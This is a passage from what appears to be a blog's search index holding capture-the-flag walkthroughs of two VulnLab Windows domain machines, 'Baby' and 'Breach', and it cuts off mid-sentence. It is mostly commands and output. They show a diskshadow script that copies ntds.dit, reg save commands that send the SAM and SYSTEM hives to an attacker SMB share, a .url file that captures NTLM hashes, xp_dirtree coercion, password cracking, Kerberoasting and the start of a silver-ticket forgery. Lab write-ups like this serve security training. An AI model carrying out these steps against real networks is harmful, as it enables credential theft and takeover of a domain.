\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0S-1-5-32-551 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Mandatory group, Enabled by default, Enabled group  \nBUILTIN\\Users \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Alias \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0S-1-5-32-545 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Mandatory group, Enabled by default, Enabled group  \nBUILTIN\\Pre-Windows 2000 Compatible Access Alias \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0S-1-5-32-554 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Mandatory group, Enabled by default, Enabled group  \nBUILTIN\\Remote Management Users \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Alias \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0S-1-5-32-580 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Mandatory group, Enabled by default, Enabled group  \nNT AUTHORITY\\NETWORK \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Well-known group S-1-5-2 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Mandatory group, Enabled by default, Enabled group  \nNT AUTHORITY\\Authenticated Users \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Well-known group S-1-5-11 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Mandatory group, Enabled by default, Enabled group  \nNT AUTHORITY\\This Organization \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Well-known group S-1-5-15 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Mandatory group, Enabled by default, Enabled group  \nBABY\\it \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Group \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0S-1-5-21-1407081343-4001094062-144464765  \n4-1109 Mandatory group, Enabled by default, Enabled group  \nNT AUTHORITY\\NTLM Authentication \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Well-known group S-1-5-64-10 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Mandatory group, Enabled by default, Enabled group  \nMandatory Label\\High Mandatory Level \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Label \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0S-1-16-12288  \n\n\nPRIVILEGES INFORMATION  \n----------------------  \n\nPrivilege Name \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Description \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0State  \n============================= ============================== =======  \nSeMachineAccountPrivilege \u00a0\u00a0\u00a0\u00a0Add workstations to domain \u00a0\u00a0\u00a0\u00a0Enabled  \nSeBackupPrivilege \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Back up files and directories \u00a0Enabled  \nSeRestorePrivilege \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Restore files and directories \u00a0Enabled  \nSeShutdownPrivilege \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Shut down the system \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Enabled  \nSeChangeNotifyPrivilege \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Bypass traverse checking \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Enabled  \nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled  \n\n\nUSER CLAIMS INFORMATION  \n-----------------------  \n\nUser claims unknown.  \n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre> <p>Note the SeBackupPrivilege. We can abuse this using the method here: </p> <p>Privileged Groups | HackTricks</p> <p>I added the \"X\" to the end of each line because I found that the last character was getting stripped off in the next step.</p> <pre><code>set metadata C:\\Windows\\Temp\\meta.cabX\nset context clientaccessibleX\nset context persistentX\nbegin backupX\nadd volume C: alias cdriveX\ncreateX\nexpose %cdrive% F:X\nend backupX\n</code></pre> <p>Then I uploaded that to the <code>C:\\Windows\\Tasks</code> directory and executed it with:</p> <pre><code>diskshadow /s script.txt\n</code></pre> <p>After running the script with diskshadow, we can see that we've successfully backed up the <code>C:\\</code> drive.</p> <pre><code>*Evil-WinRM* PS C:\\Windows\\Tasks&gt; diskshadow /s script.txt  \nMicrosoft DiskShadow version 1.0  \nCopyright (C) 2013 Microsoft Corporation  \nOn computer: \u00a0BABYDC, \u00a06/21/2024 12:37:10 PM  \n\n-&gt; set metadata C:\\Windows\\Temp\\meta.cab  \n-&gt; set context clientaccessible  \n-&gt; set context persistent  \n-&gt; begin backup  \n-&gt; add volume C: alias cdrive  \n-&gt; create  \nAlias cdrive for shadow ID {0925b2b9-cf5d-427d-9a6b-ba68992a63fc} set as environment variable.  \nAlias VSS_SHADOW_SET for shadow set ID {ed611205-454f-4713-9c5c-c41e3ca812e0} set as environment variable.  \n\nQuerying all shadow copies with the shadow copy set ID {ed611205-454f-4713-9c5c-c41e3ca812e0}  \n\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0* Shadow copy ID = {0925b2b9-cf5d-427d-9a6b-ba68992a63fc} \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0%cdrive%  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- Shadow copy set: {ed611205-454f-4713-9c5c-c41e3ca812e0} \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0%VSS_SHADOW_SET%  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- Original count of shadow copies = 1  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- Original volume name: \\\\?\\Volume{1b77e212-0000-0000-0000-100000000000}\\ [C:\\]  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- Creation time: 6/21/2024 12:37:29 PM  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- Originating machine: BabyDC.baby.vl  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- Service machine: BabyDC.baby.vl  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- Not exposed  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- Attributes: \u00a0No_Auto_Release Persistent Differential  \n\nNumber of shadow copies listed: 1  \n-&gt; expose %cdrive% F:  \n-&gt; %cdrive% = {0925b2b9-cf5d-427d-9a6b-ba68992a63fc}  \nThe shadow copy was successfully exposed as F:\\.  \n-&gt; end backup  \n-&gt;\n</code></pre> <p>Once that's done, we can make a copy of the ntds.dit file using:</p> <pre><code>robocopy /B F:\\Windows\\NTDS . ntds.dit\n</code></pre> <p>Once that's copied, we can transfer it back over to the attacker machine. I set up an SMB server using <code>smbserver.py</code> for the transfer. </p> <p>On the target computer:</p> <pre><code>net use \\\\attacker-address\\share /user:&lt;USER&gt; &lt;PASSWORD&gt;\n</code></pre> <pre><code>*Evil-WinRM* PS C:\\Windows\\Tasks&gt; copy ntds.dit \\\\10.8.2.86\\pwnshare\\ntds.dit\n</code></pre> <p>After we have the ntds.dit file copied over to our attacker machine, we need to grab the SAM and SYSTEM hives as well. </p> <pre><code>*Evil-WinRM* PS C:\\Windows\\Tasks&gt; reg save HKLM\\sam \\\\10.8.2.86\\pwnshare\\sam.sav\nThe operation completed successfully.\n</code></pre> <pre><code>*Evil-WinRM* PS C:\\Windows\\Tasks&gt; reg save HKLM\\system \\\\10.8.2.86\\pwnshare\\system.sav\nThe operation completed successfully.\n</code></pre> <p>Now that we have all these files on our attacker machine, we can run <code>secretsdump.py</code> to extract all the stored credentials.</p> <pre><code>\u3009secretsdump.py -sam sam.sav -system system.sav -ntds ntds.dit LOCAL  \nImpacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra  \n\n[...SNIP...]\n\n[*] Reading and decrypting hashes from ntds.dit \u00a0  \nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::  \n\n[...SNIP...]\n</code></pre> <p>Now that we have all the stored credentials, we can just grab the domain admin's NT hash and log in to get the final flag. </p> <pre><code>\u3009nxc smb $ip -u 'Administrator' -H '[REDACTED]'  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (sig  \nning:True) (SMBv1:False)  \nSMB \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a010.10.65.95 \u00a0\u00a0\u00a0\u00a0445 \u00a0\u00a0\u00a0BABYDC \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0[+] baby.vl\\Administrator:[REDACTED] (Pwn3d!)\n</code></pre>","tags":["ldap","backup","secretsdump"]},{"location":"blog/2024/06/22/vulnlab-breach.html","title":"VulnLab: Breach","text":"<p>Breach is a MEDIUM difficulty machine on VulnLab. This machine involved abusing anonymous access to an SMB share to upload a URL link file to a specific directory to induce an authentication request from a user and cracking the resulting NetNTLMv2 hash. Using those credentials, we can kerberoast a service account and crack the krb5tgs hash to recover the password of the service, and then use that password to create a silver ticket impersonating the local administrator of the box. With that, we abuse the <code>xp_cmdshell</code> functionality on an MS-SQL service to get a shell on the box and capture the first flag. Finally, we can abuse the <code>SeImpersonatePrivilege</code> to escalate to SYSTEM and get the final flag.</p> <p></p>","tags":["silverticket","kerberoasting","smb","privilege-abuse"]},{"location":"blog/2024/06/22/vulnlab-breach.html#walkthrough","title":"Walkthrough","text":"","tags":["silverticket","kerberoasting","smb","privilege-abuse"]},{"location":"blog/2024/06/22/vulnlab-breach.html#nmap","title":"Nmap","text":"<p>The nmap scan seems fairly normal; I don't see any really weird ports or anything that really stands out to begin with.</p> <pre><code>10.10.106.145:53\n10.10.106.145:80\n10.10.106.145:88\n10.10.106.145:135\n10.10.106.145:139\n10.10.106.145:389\n10.10.106.145:445\n10.10.106.145:464\n10.10.106.145:593\n10.10.106.145:636\n10.10.106.145:1433\n10.10.106.145:3268\n10.10.106.145:3269\n10.10.106.145:3389\n10.10.106.145:5985\n10.10.106.145:9389\n10.10.106.145:49664\n10.10.106.145:49667\n10.10.106.145:49669\n10.10.106.145:61306\n10.10.106.145:62194\n10.10.106.145:62416\n</code></pre>","tags":["silverticket","kerberoasting","smb","privilege-abuse"]},{"location":"blog/2024/06/22/vulnlab-breach.html#service-enumeration","title":"Service Enumeration","text":"","tags":["silverticket","kerberoasting","smb","privilege-abuse"]},{"location":"blog/2024/06/22/vulnlab-breach.html#smb","title":"SMB","text":"<p>We can run a quick scan with <code>NetExec</code> just to get the domain and computer name.</p> <pre><code>\u3009nxc smb $ip\nSMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\n</code></pre> <p>We don't have any luck with a null session, but we do have anonymous (Guest) access to a few of the network shares. </p> <pre><code>\u3009nxc smb $ip -u 'anonymous' -p '' --shares\nSMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         10.10.106.145   445    BREACHDC         [+] breach.vl\\anonymous: (Guest)\nSMB         10.10.106.145   445    BREACHDC         [*] Enumerated shares\nSMB         10.10.106.145   445    BREACHDC         Share           Permissions     Remark\nSMB         10.10.106.145   445    BREACHDC         -----           -----------     ------\nSMB         10.10.106.145   445    BREACHDC         ADMIN$                          Remote Admin\nSMB         10.10.106.145   445    BREACHDC         C$                              Default share\nSMB         10.10.106.145   445    BREACHDC         IPC$            READ            Remote IPC\nSMB         10.10.106.145   445    BREACHDC         NETLOGON                        Logon server share\nSMB         10.10.106.145   445    BREACHDC         share           READ,WRITE\nSMB         10.10.106.145   445    BREACHDC         SYSVOL                          Logon server share\nSMB         10.10.106.145   445    BREACHDC         Users           READ\n</code></pre> <p>It probably wasn't SUPER necessary for this box, but since we can read the <code>IPC$</code> share, we can grab a list of users using <code>--rid-brute</code> with <code>netexec</code>. </p> <pre><code>\u3009nxc smb $ip -u 'anonymous' -p '' --rid-brute\nSMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         10.10.106.145   445    BREACHDC         [+] breach.vl\\anonymous: (Guest)\nSMB         10.10.106.145   445    BREACHDC         498: BREACH\\Enterprise Read-only Domain Controllers (SidTypeGroup)\nSMB         10.10.106.145   445    BREACHDC         500: BREACH\\Administrator (SidTypeUser)\nSMB         10.10.106.145   445    BREACHDC         501: BREACH\\Guest (SidTypeUser)\n\n[...SNIP...]\n\nSMB         10.10.106.145   445    BREACHDC         1105: BREACH\\Claire.Pope (SidTypeUser)\nSMB         10.10.106.145   445    BREACHDC         1106: BREACH\\Julia.Wong (SidTypeUser)\nSMB         10.10.106.145   445    BREACHDC         1107: BREACH\\Hilary.Reed (SidTypeUser)\nSMB         10.10.106.145   445    BREACHDC         1108: BREACH\\Diana.Pope (SidTypeUser)\nSMB         10.10.106.145   445    BREACHDC         1109: BREACH\\Jasmine.Price (SidTypeUser)\nSMB         10.10.106.145   445    BREACHDC         1110: BREACH\\George.Williams (SidTypeUser)\nSMB         10.10.106.145   445    BREACHDC         1111: BREACH\\Lawrence.Kaur (SidTypeUser)\nSMB         10.10.106.145   445    BREACHDC         1112: BREACH\\Jasmine.Slater (SidTypeUser)\nSMB         10.10.106.145   445    BREACHDC         1113: BREACH\\Hugh.Watts (SidTypeUser)\nSMB         10.10.106.145   445    BREACHDC         1114: BREACH\\Christine.Bruce (SidTypeUser)\nSMB         10.10.106.145   445    BREACHDC         1115: BREACH\\svc_mssql (SidTypeUser)\n</code></pre> <p>Whittling that down a bit we get this list. We can set this aside for now...SPOILER -- we don't really need it.</p> <pre><code>BREACH\\Administrator\nBREACH\\Guest\nBREACH\\krbtgt\nBREACH\\BREACHDC$\nBREACH\\Claire.Pope\nBREACH\\Julia.Wong\nBREACH\\Hilary.Reed\nBREACH\\Diana.Pope\nBREACH\\Jasmine.Price\nBREACH\\George.Williams\nBREACH\\Lawrence.Kaur\nBREACH\\Jasmine.Slater\nBREACH\\Hugh.Watts\nBREACH\\Christine.Bruce\nBREACH\\svc_mssql\n</code></pre> <p>Going back to the list of shares, Checking out the <code>transfer</code> directory within the <code>share</code> share, we find three user folders. Unfortunately, we don't have anonymous access to any of them. </p> <pre><code># cd transfer\n# ls\ndrw-rw-rw-          0  Thu Feb 17 08:00:35 2022 .\ndrw-rw-rw-          0  Fri Jun 21 13:54:30 2024 ..\ndrw-rw-rw-          0  Thu Feb 17 05:23:51 2022 claire.pope\ndrw-rw-rw-          0  Thu Feb 17 05:23:22 2022 diana.pope\ndrw-rw-rw-          0  Thu Feb 17 05:24:39 2022 julia.wong\n</code></pre> <p>To abuse our write privileges on the <code>share</code> share, we can create the following file and name it something like <code>@secret.url</code>.</p> <pre><code>[InternetShortcut]\nURL=anyurl\nWorkingDirectory=anydir\nIconFile=\\\\10.8.2.86\\%USERNAME%.icon\nIconIndex=1\n</code></pre> <p>After putting that link file in the <code>transfer</code> directory we get an authentication request right away from <code>julia.wong</code>.</p> <pre><code>[+] Listening for events...\n\n[SMB] NTLMv2-SSP Client   : 10.10.106.145\n[SMB] NTLMv2-SSP Username : BREACH\\Julia.Wong\n[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:2f03fd15fd6a6fn</code></pre>","tags":["silverticket","kerberoasting","smb","privilege-abuse"]},{"location":"blog/2024/06/22/vulnlab-breach.html#foothold","title":"Foothold","text":"<p>We've got a hash -- let's see if it will crack</p> <pre><code>Julia.Wong::BREACH:2f03fd15fd6a6fn</code></pre> <p>The hash cracked almost immediately using JohnTheRipper.</p> <pre><code>\u3009john --wordlist=/usr/share/wordlists/rockyou.txt julia.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nComputer1        (Julia.Wong)\n1g 0:00:00:00 DONE (2024-06-21 14:58) 4.761g/s 585142p/s 585142c/s 558545C/s bratz1234..monforte\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>We can get the local.txt flag from within the <code>\\share\\transfer\\julia.wong</code> folder. </p> <pre><code># cd ../transfer\n\n# ls\ndrw-rw-rw-          0  Fri Jun 21 14:55:39 2024 .\ndrw-rw-rw-          0  Fri Jun 21 15:13:28 2024 ..\n-rw-rw-rw-        103  Fri Jun 21 14:55:40 2024 @secret.url\ndrw-rw-rw-          0  Thu Feb 17 05:23:51 2022 claire.pope\ndrw-rw-rw-          0  Thu Feb 17 05:23:22 2022 diana.pope\ndrw-rw-rw-          0  Thu Feb 17 05:24:39 2022 julia.wong\n\n# cd julia.wong\n\n# ls\ndrw-rw-rw-          0  Thu Feb 17 05:24:39 2022 .\ndrw-rw-rw-          0  Fri Jun 21 14:55:39 2024 ..\n-rw-rw-rw-         36  Thu Feb 17 05:25:02 2022 local.txt\n\n# cat local.txt\nVL{****************}\n</code></pre> <p>We can confirm that the password works using <code>netexec</code>.</p> <pre><code>\u3009nxc smb $ip -u 'julia.wong' -p 'Computer1'\nSMB         10.10.106.145   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)\nSMB         10.10.106.145   445    BREACHDC         [+] breach.vl\\julia.wong:Computer1\n</code></pre> <p>Unfortunately, logging into the machine via WinRM and RDP did not work here. However, after poking around a bit, we can see two ways to move to the next step: Kerberoasting and \"stealing\" a hash from the MSSQL service.</p>","tags":["silverticket","kerberoasting","smb","privilege-abuse"]},{"location":"blog/2024/06/22/vulnlab-breach.html#stealing-the-hash","title":"Stealing the hash","text":"<p>We're able to access the MSSQL service on the machine using the <code>julia.wong</code> credentials. Unfortunately, that user is not able to impersonate any other users and does not have permissions to enable <code>xp_cmdshell</code>. There's also not really any interesting information stored in the database. However, the <code>xp_dirtree</code> method IS enabled in MSSQL, so we can use that to trigger an authentication request to our machine by giving the <code>xp_dirtree</code> method the UNC path for our machine, as follows:</p> <pre><code>SQL (BREACH\\Julia.Wong  guest@master)&gt; xp_dirtree \\\\10.8.2.86\\share\nsubdirectory   depth   file\n------------   -----   ----\n</code></pre> <p>After running that, we get a NetNTLMv2 hash from the <code>svc_mssql</code> user. </p> <pre><code>[SMB] NTLMv2-SSP Client   : 10.10.106.145\n[SMB] NTLMv2-SSP Username : BREACH\\svc_mssql\n[SMB] NTLMv2-SSP Hash     : svc_mssql::BREACH:b57510dba0e54bb6:99154DA56D398E95285417022BADC33B:010100000000000000E43590ECC3DA018EC09BDAB9FB81700000000002000800330045004700320001001E00570049004E002D005000340046004D004A0032004E00570042004500370004003400570049004E002D005000340046004D004A0032004E0057004200450037002E0033004500470032002E004C004F00430041004C000300140033004500470032002E004C004F00430041004C000500140033004500470032002E004C004F00430041004C000700080000E43590ECC3DA0106000400020000000800300030000000000000000000000000300000C618B0A90271E5BE5B10EB3CFE6C7F63D0A6A1DCDEB9C7C3B40E9F26C5A2CBCC0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0032002E00380036000000000000000000\n</code></pre> <p>That also cracked quickly.</p> <pre><code>\u3009john --wordlist=/usr/share/wordlists/rockyou.txt svc_mssql.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nTrustno1         (svc_mssql)\n1g 0:00:00:00 DONE (2024-06-21 15:08) 10.00g/s 532480p/s 532480c/s 532480C/s truckin..spook\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>Unfortunately, even when accessing the MSSQL service as the <code>svc_mssql</code> user, we are still not able to enable the <code>xp_cmdshell</code> method. </p>","tags":["silverticket","kerberoasting","smb","privilege-abuse"]},{"location":"blog/2024/06/22/vulnlab-breach.html#kerberoasting","title":"Kerberoasting","text":"<p>The other, and probably the intended way, to move forward is by Kerberoasting accounts with a Service Principal Name (SPN) configured...basically user accounts configured to run a service. We can do this from Linux using <code>GetUserSPNs.py</code>. </p> <pre><code>\u3009GetUserSPNs.py -dc-ip $ip -usersfile users.txt breach.vl/julia.wong:Computer1 -request\n\n[...SNIP...]\n\n$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$4a09f433107440b8e60966bbc298712a$4ca88e23438989cd4cf9ce8a48ee449e47157f2ea639377b5a7acc85f36279cfe78077a6a024ab7af9c9cd43140ea79bf531aacb2977b9ff301051709626bea486fd469962a4d8415511f62eda96f5a3778c742c2f7c191c5d606376f807daa317206920a720fa8193387f6ae96e59cea2ecd5477e851e7709d0177b7e62751e9feb763257cc7cd4304ac7489d13ddd442ad738ab5b93f28690f6f163f8bf570058423c9ed2f6d3c4442f04585214bb7a4a9b8d1f8bd4fba4911f113df27e7b17e19b7e820af092069bb570a47811c6979cfb2d00615776883276e7f6373830ce62eb69dc0c560198692a2c2d0687d6435f5b7aa29bb4021ca76c482ff34bde986c0e31c27a2cd08c491172ffac7480bc4e86f76f3707aceefb485f097d48c36164ae65a400cbfb88c409f1b0b8384c177a88c1eb5527ca6a2ddf1adce8090860e4b7e02362f5f6ebdccfb023e4831541378977535d1a56831a4bbd70c5e5f04af5f1c37aca5e330a1dd11b06a6bfb4e71d1759effee6f486c6b3d06daaeaafac657ea41fdeb9b41a97ecba231c4635bd6a18ef560edc9fb5cf2e2a22007ed3c2f083a51da2e9120dc0649925676af8229bba2dee75ccf4e28513889ec98b8fff8afd31a465b68f20c2fdeda592cb6d18de49f05f6e552c4af74c05b027b1ee59088619764ffd226b3516d33371ca4ca879f543e8d475bc52197a9d102bc1d272afc4f2e9d31c8d033c48011060d4bdb776c68f9d2296fbb0d8dde6787a152a30ffbf690c877e5b17c98c16e6fc29b0433adac2dd5df39554986da366dc6ccc883ddfad9cfef58c9b651971ed496ee1d81e129e122fbcc945957fc092f118913cf032dc00115f7c5527eab70df747e7b89de0b5a7829e1ce355dc81f1f7ec98ed4f493be485232bb692ce77b9cf568a0d107451786375aa534ef23c48ac2d2d6601ba9f3b550eb213a0cc9e782dd657936a30ce6370849b0fd3b2488f9e446d9c5e09b67bca52fb5f4130c07dc8d4b4b06631ae480db174d295583cd9e88987161d4f10ce82c24da4e73cfac369040dd7c51a694d4007d42ddbd37dba266cd43ba0cc0fa7775b45487fa69f676b6b76193f29db714e3f1ee08e49c974ea14487165d05d7ba62352026ac01a9eacb52015a0e79450ee32074967a30d657640d765fcc920a85f2a0e545149c7acb1eed4c067cb3264500d7e1a8a0d0718be23900b99ddf82dd3451d3b535a794e2e3061d5494e3f3dc7169a7ba4e135e1c2a87bc84b4ce1543d0425d07b7f70a0fe73debf3428d5adb9be20cc01ee0a00cfc4684a5e0051351f3530e10f417fff0218541bbda5b7a0ede1983bc8367cde265deff1017ecf361c862bde610064d3f586042d41ae9a3e704b3c12c0870b2e64dabb232e76f67bcd1ba3762a3cb4a92037817724f8f12f013816831d51b0ef459a696d1d093c2915ad4d0504cad7de9f2452ccbf03cd9\n</code></pre> <p>We can also crack the krb5tgs hash to recover the password for the <code>svc_mssql</code> user.</p>","tags":["silverticket","kerberoasting","smb","privilege-abuse"]},{"location":"blog/2024/06/22/vulnlab-breach.html#silver-ticket","title":"Silver ticket","text":"<p>In order to create a silver ticket, we need the NT hash of the <code>svc_mssql</code> user...not a plaintext password. We can generate an NT using <code>iconv</code> and <code>openssl</code>. </p> <pre><code>\u3009iconv -f ASCII -t UTF-16LE &lt;(printf \"Trustno1\") | openssl dgst -md4\nMD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c\n</code></pre> <p>Now we also need the domain SID, which we can get using <code>lookupsid.py</code> from the Impacket suite.</p> <pre><code>\u3009lookupsid.py breach.vl/svc_mssql:Trustno1@$ip\nImpacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra\n\n[*] Brute forcing SIDs at 10.10.106.145\n[*] StringBinding ncacn_np:10.10.106.145[\\pipe\\lsarpc]\n[*] Domain SID is: S-1-5-21-2330692793-3312915120-706255856\n\n[...SNIP...]\n</code></pre> <p>With those two items, we can create the silver ticket with <code>ticketer.py</code>, giving us the ability to access the MSSQL service on the DC as the local administrator. By default, the local administrator is a system administrator in MSSQL server, so hopefully we should be able to enable <code>xp_cmdshell</code> and get command execution 